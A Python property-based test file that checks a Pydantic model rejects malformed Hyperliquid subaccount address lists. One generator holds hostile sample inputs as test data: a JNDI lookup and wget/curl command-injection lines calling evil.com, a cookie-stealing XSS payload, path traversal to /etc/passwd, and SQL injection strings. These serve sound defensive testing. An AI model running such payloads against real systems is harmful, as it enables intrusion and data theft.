"""Property-based tests for Hyperliquid raw subaccounts models.

These tests validate critical security boundary models that process external subaccount data.
The models tested here are essential for multi-account management and subaccount validation.

SECURITY CRITICAL: These raw models protect against:
- Malicious subaccount address data that could manipulate account access
- Buffer overflow attacks through oversized address lists
- Injection attacks through malformed Ethereum addresses
- Type confusion that could bypass address validation
- Address spoofing and manipulation attacks
- Account enumeration through invalid address formats

Property testing ensures comprehensive coverage of subaccount edge cases and adversarial inputs.
"""

import string
from typing import Any

import pytest
from hypothesis import assume, given, strategies as st
from hypothesis.strategies import DrawFn, SearchStrategy
from pydantic import ValidationError

from cyberdelta.apis.hyperliquid.models.hl_raw_subaccounts import (
    HyperliquidRawSubAccountsResponse,
)
from cyberdelta.exceptions.field_validation import TypeFieldError
from cyberdelta.exceptions.parsing import EmptyStringError


# =============================================================================
# HYPOTHESIS STRATEGIES FOR SUBACCOUNTS MODEL TESTING
# =============================================================================


def valid_ethereum_address_strategy() -> SearchStrategy[str]:
    """Generate valid Ethereum addresses for subaccounts."""
    return st.one_of([
        # Known valid addresses
        st.sampled_from([
            "0x1234567890abcdef1234567890abcdef12345678",
            "0xabcdef1234567890abcdef1234567890abcdef12",
            "0x742d35cc6aB26c94C2cF04E1b1F4c2eD2bF4D1C3",
            "0x1d5c8F72c8F6bE8B8A6C6e3F4D5B7A8c9D0E1F2A",
            "0xDe0B295669a9FD93d5F28D9Ec85E40f4cb697BAe",
            "0x0000000000000000000000000000000000000000",  # Zero address
        ]),
        # Generated valid addresses
        st.builds(
            lambda hex_part: f"0x{hex_part}",
            st.text(min_size=40, max_size=40, alphabet=string.hexdigits),
        ),
    ])


def invalid_ethereum_address_strategy() -> SearchStrategy[str]:
    """Generate invalid Ethereum address strings."""
    return st.one_of([
        # Wrong length
        st.text(min_size=1, max_size=39, alphabet=string.hexdigits),
        st.text(min_size=41, max_size=100, alphabet=string.hexdigits),
        # Missing 0x prefix
        st.text(min_size=40, max_size=40, alphabet=string.hexdigits),
        # Wrong prefix
        st.builds(
            lambda prefix, hex_part: f"{prefix}{hex_part}",
            st.sampled_from(["0X", "1x", "x", "00x", ""]),
            st.text(min_size=40, max_size=40, alphabet=string.hexdigits),
        ),
        # Invalid characters
        st.builds(
            lambda hex_part: f"0x{hex_part}",
            st.text(
                min_size=40,
                max_size=40,
                alphabet="ghijklmnopqrstuvwxyzGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()",
            ),
        ),
        # Common invalid formats
        st.just("0xshort"),
        st.just("longaddress" * 10),
        st.just("no_prefix_address_aaaaaaaaaaaaaaaaaaaaaa"),
        st.just("0x"),
        st.just(""),
    ])


@st.composite
def valid_subaccounts_list_strategy(draw: DrawFn) -> list[str]:
    """Generate valid lists of Ethereum addresses."""
    return draw(
        st.lists(
            valid_ethereum_address_strategy(),
            min_size=0,
            max_size=20,
        )
    )


def malicious_subaccounts_strategy() -> SearchStrategy[Any]:
    """Generate malicious values for subaccounts security testing."""
    return st.one_of([
        # Subaccount manipulation attempts
        st.just("${jndi:ldap://evil.com/steal-accounts}"),
        st.just("../../etc/passwd"),  # Path traversal
        # XSS attempts
        st.just("<script>alert('subaccount-xss')</script>"),
        st.just("<img src=x onerror=alert(document.cookie)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE subaccounts;--"),
        st.just("1' UNION SELECT * FROM accounts--"),
        # Buffer overflow attempts
        st.text(min_size=1000, max_size=1500),
        st.just("S" * 10000),
        # Unicode attacks
        st.just("\udce2\udc28\udc00"),  # Lone surrogates
        st.just("\x00\x01\x02"),  # Control characters
        # Format string attacks
        st.just("%s%s%s%s%n"),
        st.just("%x%x%x%x"),
        # Command injection
        st.just("; wget evil.com/backdoor"),
        st.just("`curl evil.com/exfiltrate`"),
        # NoSQL injection
        st.just("'; return db.subaccounts.find(); //"),
        # JSON injection
        st.just('{"$where": "this.address.length > 0"}'),
        # Address manipulation
        st.just("0x123'; UPDATE accounts SET balance=0;--"),
        # Type confusion
        st.none(),
        st.integers(),
        st.floats(),
        st.booleans(),
        st.dictionaries(st.text(), st.text()),
        st.binary(),
        # Invalid list structures
        st.lists(st.integers()),
        st.lists(st.none()),
        st.lists(st.dictionaries(st.text(), st.text())),
        st.lists(st.lists(st.text())),  # Nested lists
    ])


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW SUBACCOUNTS RESPONSE MODEL
# =============================================================================


class TestHyperliquidRawSubAccountsResponseProperties:
    """Property-based tests for HyperliquidRawSubAccountsResponse validation and security."""

    @given(subaccounts_list=valid_subaccounts_list_strategy())
    def test_subaccounts_validation_success_properties(self, subaccounts_list: list[str]) -> None:
        """Property: Valid subaccounts list should always create valid HyperliquidRawSubAccountsResponse objects."""
        # Skip invalid data
        try:
            # Validate all addresses
            for address in subaccounts_list:
                assume(isinstance(address, str))
                assume(len(address) == 42)  # 0x + 40 hex chars
                assume(address.startswith("0x"))
                assume(all(c in string.hexdigits for c in address[2:]))
        except (TypeError, IndexError):
            assume(False)

        obj = HyperliquidRawSubAccountsResponse.model_validate(subaccounts_list)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawSubAccountsResponse)

        # Property: Root should contain the validated list
        assert obj.root == subaccounts_list
        assert isinstance(obj.root, list)
        assert len(obj.root) == len(subaccounts_list)

        # Property: All addresses should be preserved
        for i, address in enumerate(subaccounts_list):
            assert obj.root[i] == address
            assert isinstance(obj.root[i], str)

    @given(malicious_value=malicious_subaccounts_strategy())
    def test_subaccounts_security_boundary_properties(self, malicious_value: Any) -> None:
        """Property: Subaccounts response should reject malicious inputs safely."""
        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidRawSubAccountsResponse.model_validate(malicious_value)

    @given(
        valid_addresses=st.lists(valid_ethereum_address_strategy(), min_size=1, max_size=5),
        invalid_address=invalid_ethereum_address_strategy(),
    )
    def test_subaccounts_mixed_valid_invalid_properties(
        self, valid_addresses: list[str], invalid_address: str
    ) -> None:
        """Property: Subaccounts list with any invalid address should be rejected."""
        # Insert invalid address at random position
        position = 0 if not valid_addresses else len(valid_addresses) // 2
        mixed_list = valid_addresses[:position] + [invalid_address] + valid_addresses[position:]

        # Property: Mixed list with invalid address should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawSubAccountsResponse.model_validate(mixed_list)

    @given(
        invalid_item=st.one_of([
            st.integers(),
            st.floats(),
            st.booleans(),
            st.none(),
            st.dictionaries(st.text(), st.text()),
            st.lists(st.text()),
        ])
    )
    def test_subaccounts_invalid_item_types_properties(self, invalid_item: Any) -> None:
        """Property: Subaccounts list should reject non-string items."""
        # Create list with invalid item
        invalid_list = ["0x1234567890abcdef1234567890abcdef12345678", invalid_item]

        # Property: List with non-string item should be rejected
        with pytest.raises((ValidationError, TypeError)):
            HyperliquidRawSubAccountsResponse.model_validate(invalid_list)

    def test_subaccounts_empty_list_properties(self) -> None:
        """Property: Empty subaccounts list should be valid."""
        # Property: Empty list should be accepted
        obj = HyperliquidRawSubAccountsResponse.model_validate([])
        assert obj.root == []
        assert isinstance(obj.root, list)
        assert len(obj.root) == 0

    @given(
        address_length=st.one_of([
            # Invalid lengths
            st.integers(min_value=1, max_value=41),
            st.integers(min_value=43, max_value=100),
        ])
    )
    def test_subaccounts_address_length_validation_properties(self, address_length: int) -> None:
        """Property: Subaccounts should reject addresses with wrong length."""
        # Create address with wrong length
        if address_length <= 2:
            invalid_address = "0x" + "a" * max(0, address_length - 2)
        else:
            invalid_address = "0x" + "a" * (address_length - 2)

        # Property: Wrong length addresses should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawSubAccountsResponse.model_validate([invalid_address])

    @given(
        prefix=st.one_of([
            st.just("0X"),  # Wrong case
            st.just("1x"),  # Wrong digit
            st.just("x"),  # Missing 0
            st.just("00x"),  # Extra 0
            st.just(""),  # Missing entirely
        ])
    )
    def test_subaccounts_address_prefix_validation_properties(self, prefix: str) -> None:
        """Property: Subaccounts should reject addresses with wrong prefix."""
        # Create address with wrong prefix
        hex_part = "1234567890abcdef1234567890abcdef12345678"
        invalid_address = prefix + hex_part

        # Property: Wrong prefix addresses should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawSubAccountsResponse.model_validate([invalid_address])

    @given(
        invalid_chars=st.text(
            min_size=40,
            max_size=40,
            alphabet="ghijklmnopqrstuvwxyzGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()",
        )
    )
    def test_subaccounts_address_character_validation_properties(self, invalid_chars: str) -> None:
        """Property: Subaccounts should reject addresses with invalid hex characters."""
        # Create address with invalid characters
        invalid_address = f"0x{invalid_chars}"

        # Property: Non-hex characters should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawSubAccountsResponse.model_validate([invalid_address])

    @given(large_list_size=st.integers(min_value=100, max_value=1000))
    def test_subaccounts_large_list_properties(self, large_list_size: int) -> None:
        """Property: Subaccounts should handle large lists correctly."""
        # Generate large list of valid addresses
        base_address = "0x1234567890abcdef1234567890abcdef1234567"
        large_list = [f"{base_address}{i:01x}" for i in range(large_list_size)]

        # Property: Large valid lists should be accepted
        obj = HyperliquidRawSubAccountsResponse.model_validate(large_list)
        assert len(obj.root) == large_list_size
        assert obj.root == large_list

    @given(subaccounts_list=valid_subaccounts_list_strategy())
    def test_subaccounts_immutability_properties(self, subaccounts_list: list[str]) -> None:
        """Property: Subaccounts response should preserve original list data."""
        # Skip invalid data
        try:
            for address in subaccounts_list:
                assume(isinstance(address, str) and len(address) == 42)
                assume(address.startswith("0x"))
        except (TypeError, IndexError):
            assume(False)

        original_list = subaccounts_list.copy()
        obj = HyperliquidRawSubAccountsResponse.model_validate(subaccounts_list)

        # Property: Original data should be preserved exactly
        assert obj.root == original_list
        assert len(obj.root) == len(original_list)

        # Property: Modifying original list shouldn't affect object
        if subaccounts_list:
            subaccounts_list[0] = "0xmodified000000000000000000000000000000"
            assert obj.root != subaccounts_list
            assert obj.root == original_list

    @given(duplicate_count=st.integers(min_value=2, max_value=10))
    def test_subaccounts_duplicate_addresses_properties(self, duplicate_count: int) -> None:
        """Property: Subaccounts should allow duplicate addresses."""
        # Create list with duplicate addresses
        address = "0x1234567890abcdef1234567890abcdef12345678"
        duplicate_list = [address] * duplicate_count

        # Property: Duplicate addresses should be accepted (business logic may handle deduplication)
        obj = HyperliquidRawSubAccountsResponse.model_validate(duplicate_list)
        assert len(obj.root) == duplicate_count
        assert all(addr == address for addr in obj.root)


# =============================================================================
# INTEGRATION TESTS WITH MIXED PROPERTY SCENARIOS
# =============================================================================


class TestHyperliquidRawSubAccountsIntegrationProperties:
    """Integration property tests for subaccounts models working together."""

    @given(
        valid_lists=st.lists(
            valid_subaccounts_list_strategy(),
            min_size=2,
            max_size=5,
        ),
        malicious_value=malicious_subaccounts_strategy(),
    )
    def test_subaccounts_batch_processing_properties(
        self, valid_lists: list[list[str]], malicious_value: Any
    ) -> None:
        """Property: Multiple subaccounts responses should be processed independently."""
        valid_responses = []

        for subaccounts_list in valid_lists:
            # Skip invalid lists
            try:
                if not all(
                    isinstance(addr, str) and len(addr) == 42 and addr.startswith("0x")
                    for addr in subaccounts_list
                ):
                    continue

                response = HyperliquidRawSubAccountsResponse.model_validate(subaccounts_list)
                valid_responses.append(response)
            except (ValidationError, TypeError):
                continue

        # Property: Each response should maintain its individual values
        for i, response in enumerate(valid_responses):
            assert isinstance(response.root, list)

            # Property: Responses should not affect each other
            for j, other_response in enumerate(valid_responses):
                if i != j:
                    # Each response is independent
                    assert isinstance(other_response.root, list)

        # Property: Malicious value should be rejected when injected
        if valid_responses:
            with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
                HyperliquidRawSubAccountsResponse.model_validate(malicious_value)

    @given(complete_malicious_data=malicious_subaccounts_strategy())
    def test_subaccounts_adversarial_input_properties(self, complete_malicious_data: Any) -> None:
        """Property: Subaccounts model should safely handle complete adversarial input."""
        # Property: Complete adversarial input should be safely rejected
        with pytest.raises((ValidationError, TypeError)):
            HyperliquidRawSubAccountsResponse.model_validate(complete_malicious_data)


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_subaccounts_valid() -> None:
    """Test subaccounts valid."""
    valid_subaccounts_response = [
        "0x1234567890abcdef1234567890abcdef12345678",
        "0xabcdef1234567890abcdef1234567890abcdef12",
    ]
    response = HyperliquidRawSubAccountsResponse.model_validate(valid_subaccounts_response)
    assert response.root == valid_subaccounts_response


def test_subaccounts_empty_list_valid() -> None:
    """Test subaccounts empty list valid."""
    response = HyperliquidRawSubAccountsResponse.model_validate([])
    assert response.root == []


def test_subaccounts_invalid_not_list() -> None:
    """Test subaccounts invalid not list."""
    with pytest.raises((ValidationError, TypeError)):
        HyperliquidRawSubAccountsResponse.model_validate("not-a-list")


def test_subaccounts_invalid_non_string_item() -> None:
    """Test subaccounts invalid non-string item."""
    with pytest.raises((ValidationError, TypeError)):
        HyperliquidRawSubAccountsResponse.model_validate([123, "0xvalid"])


def test_subaccounts_invalid_none_item() -> None:
    """Test subaccounts invalid None item."""
    with pytest.raises((ValidationError, TypeError)):
        HyperliquidRawSubAccountsResponse.model_validate([
            None,
            "0x1234567890abcdef1234567890abcdef12345678",
        ])


def test_subaccounts_invalid_dict_item() -> None:
    """Test subaccounts invalid dict item."""
    with pytest.raises((ValidationError, TypeError)):
        HyperliquidRawSubAccountsResponse.model_validate([{"key": "value"}])


def test_subaccounts_invalid_short_address() -> None:
    """Test subaccounts invalid short address."""
    with pytest.raises(ValidationError):
        HyperliquidRawSubAccountsResponse.model_validate(["0xshort"])


def test_subaccounts_invalid_long_address() -> None:
    """Test subaccounts invalid long address."""
    with pytest.raises(ValidationError):
        HyperliquidRawSubAccountsResponse.model_validate(["longaddress" * 10])


def test_subaccounts_invalid_missing_prefix() -> None:
    """Test subaccounts invalid missing prefix."""
    with pytest.raises(ValidationError):
        HyperliquidRawSubAccountsResponse.model_validate([
            "no_prefix_address_aaaaaaaaaaaaaaaaaaaaaa"
        ])


def test_subaccounts_invalid_nested_list() -> None:
    """Test subaccounts invalid nested list."""
    with pytest.raises((ValidationError, TypeError)):
        HyperliquidRawSubAccountsResponse.model_validate([["nested_list"]])


def test_subaccounts_zero_address() -> None:
    """Test subaccounts with zero address."""
    zero_address = "0x0000000000000000000000000000000000000000"
    response = HyperliquidRawSubAccountsResponse.model_validate([zero_address])
    assert response.root == [zero_address]


def test_subaccounts_mixed_case_addresses() -> None:
    """Test subaccounts with mixed case addresses."""
    mixed_case_addresses = [
        "0x1234567890ABCDEF1234567890abcdef12345678",
        "0xABCDEF1234567890abcdef1234567890ABCDEF12",
    ]
    response = HyperliquidRawSubAccountsResponse.model_validate(mixed_case_addresses)
    assert response.root == mixed_case_addresses


def test_subaccounts_duplicate_addresses() -> None:
    """Test subaccounts with duplicate addresses."""
    duplicate_address = "0x1234567890abcdef1234567890abcdef12345678"
    duplicate_list = [duplicate_address, duplicate_address]
    response = HyperliquidRawSubAccountsResponse.model_validate(duplicate_list)
    assert response.root == duplicate_list
    assert len(response.root) == 2
